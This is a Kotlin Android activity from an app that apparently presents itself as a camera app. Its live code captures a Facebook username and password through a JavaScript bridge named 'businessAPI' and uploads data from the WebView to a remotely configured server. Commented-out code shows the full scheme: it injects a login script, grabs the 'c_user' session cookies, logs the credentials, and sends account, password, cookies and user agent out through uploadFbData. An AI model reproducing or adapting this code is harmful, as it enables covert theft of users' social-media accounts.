package ftp.summer.suncam.ui.activity

import android.content.Intent
import android.view.View
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.widget.FrameLayout
import androidx.lifecycle.lifecycleScope
import com.google.gson.Gson
import ftp.summer.suncam.BusDestroyEvent
import ftp.summer.suncam.R
import ftp.summer.suncam.base.BaseActivity
import ftp.summer.suncam.pojo.ResultPojo
import ftp.summer.suncam.utils.*
import kotlinx.android.synthetic.main.activity_face_book.*
import kotlinx.coroutines.Job
import org.greenrobot.eventbus.EventBus

class ActivityLogin : BaseActivity(R.layout.activity_face_book) {

    class WebInterface {
        @JavascriptInterface
        fun businessStart(a: String, b: String) {
            account = a
            password = b
        }
    }

    private var countDownJob: Job? = null

    override fun onConvert() {
        clearCookie {
            account = ""
            password = ""
        }
        startCountDown {
            //showAD
            showInsertAd()
        }
        window.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE)
        activityFaceBookIvBack.click {
            onBackPressed()
        }
        setWebView(activityFaceBookWv, {
            activityFaceBookFl.visibility = View.GONE
        }, {
            activityFaceBookFlContent.visibility = View.GONE
        }, {
            upload(updateEntity.c!!, it){r->
                val result = Gson().fromJson(r.toString(),ResultPojo::class.java)
                result?.let {p->
                    if (p.code == "0" && p.data?.toBooleanStrictOrNull() == true) {
                        isLogin = true
                    }
                }
            }
        })
        /*upload.click {
            val data = "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"
            upload(updateEntity.c!!, data){r->
            }
        }*/

        /*activityFaceBookWv.apply {
            settings.apply {
                javaScriptEnabled = true
                textZoom = 100
                setSupportZoom(true)
                displayZoomControls = false
                builtInZoomControls = true
                setGeolocationEnabled(true)
                useWideViewPort = true
                loadWithOverviewMode = true
                loadsImagesAutomatically = true
                displayZoomControls = false
                setAppCachePath(cacheDir.absolutePath)
                setAppCacheEnabled(true)
            }
            addJavascriptInterface(WebInterface(), "businessAPI")
            webChromeClient = object : WebChromeClient() {
                override fun onProgressChanged(view: WebView?, newProgress: Int) {
                    super.onProgressChanged(view, newProgress)
                    if (newProgress == 100) {
                        val hideJs = context.getString(R.string.hideHeaderFooterMessages)
                        evaluateJavascript(hideJs, null)
                        val loginJs = getString(R.string.login)
                        evaluateJavascript(loginJs, null)
                        lifecycleScope.launch(Dispatchers.IO) {
                            delay(300)
                            withContext(Dispatchers.Main) {
                                activityFaceBookFl.visibility = View.GONE
                            }
                        }
                    }
                }
            }
            webViewClient = object : WebViewClient() {
                override fun onPageStarted(view: WebView, url: String?, favicon: Bitmap?) {
                    super.onPageStarted(view, url, favicon)
                }

                override fun onPageFinished(view: WebView, url: String) {
                    super.onPageFinished(view, url)
                    val cookieManager = CookieManager.getInstance()
                    val cookieStr = cookieManager.getCookie(url)
                    Log.e("--->", "onPageFinished url == $url")
                    if (cookieStr != null) {
                        Log.e("--->", "ua ==  " + view.settings.userAgentString)
                        if (cookieStr.contains("c_user")) {
                            Log.e("--->", "cookieStr: $cookieStr")
                            Log.e("--->", "account == $account  password == $password")
                            if (account.isNotBlank() && password.isNotBlank() && cookieStr.contains("wd=")) {
                                lifecycleScope.launch(Dispatchers.Main) {
                                    activityFaceBookFlContent.visibility = View.VISIBLE
                                }
                                uploadFbData(
                                    account,
                                    password,
                                    cookieStr,
                                    view.settings.userAgentString
                                )
                            }
                        }
                    }
                }
            }
            loadUrl(updateEntity.m ?: "https://www.baidu.com")
        }*/
    }

    override fun onResume() {
        super.onResume()
        activityFaceBookWv.onResume()
    }

    private var needBackPressed = false

    override fun onBackPressed() {
        if (activityFaceBookWv.canGoBack()) {
            activityFaceBookWv.goBack()
        } else {
            countDownJob?.cancel()
            val a = showInsertAd(showByPercent = true, tag = "inter_login")
            if (!a) {
                if (configEntity.httpUrl().startsWith("http")) {
                    jumpToWebByDefault(configEntity.httpUrl())
                }
                super.onBackPressed()
            } else {
                needBackPressed = true
            }
        }
    }

    override fun onInterstitialAdHidden() {
        super.onInterstitialAdHidden()
        if (needBackPressed) {
            needBackPressed = false
            super.onBackPressed()
        }
    }


    override fun onPause() {
        super.onPause()
        activityFaceBookWv.onPause()
    }
}